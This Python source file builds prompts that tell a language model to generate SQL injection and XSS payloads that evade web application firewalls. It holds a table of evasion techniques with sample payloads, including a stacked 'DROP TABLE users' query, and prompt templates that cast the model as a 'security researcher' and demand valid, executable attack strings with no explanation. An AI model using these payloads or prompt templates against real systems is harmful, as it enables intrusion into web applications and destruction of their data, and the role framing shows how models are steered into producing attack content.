#!/usr/bin/env python3
"""
DYNAMIC WAF-AWARE PROMPT ENGINEERING
- Analyzes blocked keywords from WAF probing
- Dynamically generates prompts with SPECIFIC evasion techniques
- Provides payload encoding hints to model
"""

class WAFAwarePromptBuilder:
    """Build dynamic prompts for WAF evasion"""
    
    # Evasion techniques with descriptions
    EVASION_TECHNIQUES = {
        'comment_obfuscation': {
            'description': 'Insert comment sequences (/**/, #, %00) between keywords',
            'examples': ["SELECT/**/1", "UNION%2a%2f%2aSELECT", "OR#\nAND"],
            'keywords': ['SELECT', 'UNION', 'WHERE', 'AND', 'OR', 'FROM'],
        },
        'case_variation': {
            'description': 'Randomize case of keywords (UnIoN instead of UNION)',
            'examples': ["SeLeCt", "UnIoN", "FrOm"],
            'keywords': ['SELECT', 'UNION', 'FROM', 'WHERE'],
        },
        'whitespace_injection': {
            'description': 'Use tabs, newlines, carriage returns instead of spaces',
            'examples': ["SELECT\t1", "UNION\n\nSELECT", "WHERE\r1=1"],
            'keywords': ['SELECT', 'UNION', 'WHERE'],
        },
        'encoding': {
            'description': 'URL encode, hex encode, or unicode encode keywords',
            'examples': ["%53%45%4c%45%43%54", "0x53454c454354", "\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054"],
            'keywords': ['SELECT', 'UNION', 'FROM'],
        },
        'alternative_functions': {
            'description': 'Use alternative SQL functions with same effect',
            'examples': ["BENCHMARK instead of SLEEP", "DATABASE instead of USER", "SUBSTRING instead of MID"],
            'keywords': ['SLEEP', 'USER', 'MID', 'SUBSTRING'],
        },
        'boolean_logic': {
            'description': 'Use boolean math (1+1=2) instead of direct conditions',
            'examples': ["(1+1)=(1+1)", "1=1 AND 1", "2>1"],
            'keywords': ['AND', 'OR', '='],
        },
        'stacked_queries': {
            'description': 'Use semicolon to stack queries; use comment to hide rest',
            'examples': ["'; DROP TABLE users; --", "1; UPDATE users SET...; --"],
            'keywords': [';', 'DROP', 'UPDATE'],
        },
        'nested_subqueries': {
            'description': 'Nest SELECT statements to extract data indirectly',
            'examples': ["(SELECT (SELECT ...data...))", "SELECT * FROM (SELECT ... LIMIT 1) x"],
            'keywords': ['SELECT'],
        },
    }
    
    @staticmethod
    def select_techniques(blocked_keywords):
        """Select top techniques based on blocked keywords"""
        technique_scores = {}
        
        for technique_name, tech_info in WAFAwarePromptBuilder.EVASION_TECHNIQUES.items():
            # Score = how many blocked keywords this technique can help bypass
            score = sum(1 for kw in blocked_keywords if kw in tech_info['keywords'])
            if score > 0:
                technique_scores[technique_name] = score
        
        # Sort by relevance score
        sorted_techniques = sorted(technique_scores.items(), key=lambda x: -x[1])
        return [t[0] for t in sorted_techniques[:4]]  # Top 4 techniques
    
    @staticmethod
    def build_evasion_focused_prompt(blocked_keywords, attack_type='sqli', num_payloads=3):
        """Build detailed prompt for WAF evasion"""
        
        # Select relevant techniques
        techniques = WAFAwarePromptBuilder.select_techniques(blocked_keywords)
        
        techniques_desc = "\n".join([
            f"• {tech}: {WAFAwarePromptBuilder.EVASION_TECHNIQUES[tech]['description']}"
            for tech in techniques
        ])
        
        techniques_examples = "\n".join([
            f"  {tech}: {', '.join(WAFAwarePromptBuilder.EVASION_TECHNIQUES[tech]['examples'][:2])}"
            for tech in techniques
        ])
        
        if attack_type.lower() == 'sqli':
            prompt = f"""You are a security researcher generating SQL injection payloads that bypass WAF filters.

ANALYSIS: The following basic techniques/keywords appear to be blocked by the WAF:
{', '.join(blocked_keywords)}

TO BYPASS THIS WAF, use the following advanced evasion techniques:

{techniques_desc}

EXAMPLES of how to apply these techniques:
{techniques_examples}

CRITICAL REQUIREMENTS:
1. Avoid the blocked keywords in CLEAR form - use evasion techniques
2. Still generate VALID SQL that executes against the database
3. Combine multiple techniques (e.g., comment + case + encoding)
4. Each payload must be different and creative
5. Output ONLY raw payload strings, one per line

Generate {num_payloads} distinct SQL injection payloads that bypass the identified filters:"""
        
        elif attack_type.lower() == 'xss':
            prompt = f"""You are a security researcher generating XSS payloads that bypass WAF filters.

ANALYSIS: The following basic techniques appear blocked:
{', '.join(blocked_keywords)}

WAF EVASION TECHNIQUES TO USE:
1. Case variation: <SCRIPT>, <Script>, <sCrIpT>
2. Alternative event handlers: onload, onpageshow, onpastemessage (instead of onerror, onclick)
3. Encoding: %3Cscript%3E, \\x3Cscript\\x3E
4. Alternative code execution: Function(), eval(), setTimeout()
5. DOM methods: window.location, window.name, document.referrer

Generate {num_payloads} XSS payloads that bypass these filters:"""
        
        else:
            prompt = f"""Generate {num_payloads} {attack_type} payloads avoiding: {', '.join(blocked_keywords)}"""
        
        return prompt
    
    @staticmethod
    def build_encoding_hint_prompt(blocked_keywords, num_payloads=3):
        """Prompt specifically about encoding techniques"""
        
        prompt = f"""Generate {num_payloads} creative SQL injection payloads that use encoding/obfuscation to bypass WAF.

The WAF blocks these keywords: {', '.join(blocked_keywords)}

Use ONLY encoding/obfuscation techniques:
- Comment injection: /**/,#,%00 between keywords
- Case mixing: UnIoN,SeLeCt
- Whitespace abuse: \\t, \\n, \\r instead of spaces
- Stacked queries with comment out
- Alternative functions with same SQL meaning

Output only raw payloads, one per line, WITHOUT explanations."""
        
        return prompt

if __name__ == "__main__":
    # Test
    blocked = ['OR', 'UNION', 'SELECT']
    print(WAFAwarePromptBuilder.build_evasion_focused_prompt(blocked))
